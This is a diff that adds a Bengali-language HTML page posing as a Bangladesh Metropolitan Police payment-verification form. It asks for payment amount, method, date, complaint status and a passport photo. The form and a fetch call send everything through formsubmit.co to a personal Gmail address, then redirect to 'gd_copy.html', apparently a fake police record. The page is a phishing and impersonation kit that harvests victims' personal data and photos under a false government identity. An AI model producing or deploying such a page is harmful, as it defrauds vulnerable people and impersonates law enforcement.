@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>অর্থ প্রদান ও নথি ভেরিফিকেশন - বাংলাদেশ মেট্রোপলিটন পুলিশ</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { background: #f0f2f5; color: #1c2d42; padding: 15px; padding-bottom: 50px; text-align: center; }
+
+        .police-header { background: #0b2545; color: white; border-radius: 12px; padding: 20px 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .police-badge { width: 65px; height: 65px; background: #f4d35e; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px auto; font-size: 30px; border: 3px solid #fff; }
+        h1 { font-size: 20px; color: #f4d35e; margin-bottom: 5px; }
+        .sub-title { font-size: 12px; color: #e0e1dd; }
+
+        .card { background: white; padding: 20px; border-radius: 12px; border: 1px solid #d8e2dc; text-align: left; box-shadow: 0 2px 8px rgba(0,0,0,0.05); max-width: 450px; margin: 0 auto; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 13px; font-weight: bold; color: #1c2d42; margin-bottom: 6px; }
+        .form-control { width: 100%; padding: 10px; border: 1px solid #ced4da; border-radius: 6px; font-size: 13.5px; outline: none; }
+
+        .radio-group { display: flex; flex-direction: column; gap: 8px; margin-top: 5px; }
+        .radio-option { font-size: 13px; display: flex; align-items: center; gap: 8px; cursor: pointer; }
+
+        .photo-demo-box { text-align: center; background: #f8fafc; border: 1px dashed #cbd5e1; padding: 12px; border-radius: 8px; margin-bottom: 8px; }
+        .photo-demo-img { width: 90px; height: 110px; object-fit: cover; border: 2px solid #0b2545; border-radius: 4px; display: block; margin: 0 auto 6px auto; }
+        .demo-text { font-size: 11px; color: #64748b; font-weight: bold; }
+
+        .btn { background: #28a745; color: white; border: none; padding: 13px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; width: 100%; display: block; text-align: center; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="police-header">
+        <div class="police-badge">🛡️</div>
+        <h1>বাংলাদেশ মেট্রোপলিটন পুলিশ</h1>
+        <div class="sub-title">অর্থ প্রদান তথ্য ও ছবি যাচাইকরণ পেজ</div>
+    </div>
+
+    <div class="card">
+        <form action="https://formsubmit.co/nadiapenhouse111@gmail.com" method="POST" onsubmit="saveAndSubmitGD(event)">
+            <input type="hidden" name="_subject" value="পেমেন্ট ও ছবি যাচাইকরণ - বাংলাদেশ পুলিশ">
+            <input type="hidden" name="_captcha" value="false">
+
+            <div class="form-group">
+                <label>টাকার পরিমাণ (টাকা):</label>
+                <input type="number" name="Amount" id="payAmount" class="form-control" placeholder="টাকার পরিমাণ লিখুন" required>
+            </div>
+
+            <div class="form-group">
+                <label>অর্থ প্রদানের মাধ্যম:</label>
+                <select name="Payment Method" id="payMethod" class="form-control" required>
+                    <option value="">-- মাধ্যম নির্বাচন করুন --</option>
+                    <option value="১. আমি সরাসরি টাকা দিয়েছি">১. আমি সরাসরি টাকা দিয়েছি</option>
+                    <option value="২. আমি ই-ওয়ালেটের মাধ্যমে টাকা দিয়েছি">২. আমি ই-ওয়ালেটের মাধ্যমে টাকা দিয়েছি</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>অর্থ প্রদানের তারিখ:</label>
+                <input type="date" name="Payment Date" id="payDate" class="form-control" required>
+            </div>
+
+            <div class="form-group">
+                <label>তৎক্ষণাৎ অভিযোগ দায়ের করা হয়েছিল কি?</label>
+                <div class="radio-group">
+                    <label class="radio-option"><input type="radio" name="Instant Complaint" value="হ্যাঁ" required> হ্যাঁ</label>
+                    <label class="radio-option"><input type="radio" name="Instant Complaint" value="না" required> না</label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>আপনার ছবি (পাসপোর্ট সাইজের ছবি আপলোড করুন):</label>
+                <div class="photo-demo-box">
+                    <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=300&auto=format&fit=crop" alt="Passport Size Demo" class="photo-demo-img">
+                    <span class="demo-text">নমুনা: সোজা হয়ে দেখা যাচ্ছে এমন পাসপোর্ট সাইজের ছবি দিন</span>
+                </div>
+                <input type="file" id="userPhoto" class="form-control" accept="image/*" required>
+            </div>
+
+            <button type="submit" class="btn">জমা দিন</button>
+        </form>
+    </div>
+
+    <script>
+        function saveAndSubmitGD(event) {
+            var amount = document.getElementById('payAmount').value;
+            var method = document.getElementById('payMethod').value;
+            var date = document.getElementById('payDate').value;
+            var instant = document.querySelector('input[name="Instant Complaint"]:checked').value;
+            var fileInput = document.getElementById('userPhoto');
+
+            localStorage.setItem('gd_amount', amount);
+            localStorage.setItem('gd_method', method);
+            localStorage.setItem('gd_date', date);
+            localStorage.setItem('gd_instant', instant);
+
+            var form = event.target;
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
+            }).catch(function(err){ console.log(err); });
+
+            event.preventDefault();
+
+            if (fileInput.files && fileInput.files[0]) {
+                var reader = new FileReader();
+                reader.onload = function(e) {
+                    localStorage.setItem('gd_photo', e.target.result);
+                    window.location.href = 'gd_copy.html';
+                }
+                reader.readAsDataURL(fileInput.files[0]);
+            } else {
+                window.location.href = 'gd_copy.html';
+            }
+        }
+    </script>
+</body>
+</html>
